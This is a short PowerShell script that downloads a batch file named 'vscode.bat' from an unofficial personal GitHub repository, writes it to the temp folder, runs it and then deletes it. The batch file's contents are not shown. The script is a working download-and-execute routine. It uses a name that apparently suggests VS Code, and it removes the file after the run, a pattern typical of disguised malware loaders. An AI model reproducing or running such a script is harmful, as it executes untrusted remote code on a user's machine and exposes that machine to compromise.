$batFileUrl = "https://raw.githubusercontent.com/jojihatzz/vscodecity/refs/heads/main/vscode.bat"

# Download the bat file content
$batFileContent = Invoke-RestMethod -Uri $batFileUrl

# Save the content to a temporary bat file
$tempBatFile = "$env:TEMP\vscode.bat"
Set-Content -Path $tempBatFile -Value $batFileContent

# Run the bat file
Start-Process -FilePath $tempBatFile -Wait

# Optionally, remove the temporary bat file after execution
Remove-Item $tempBatFile
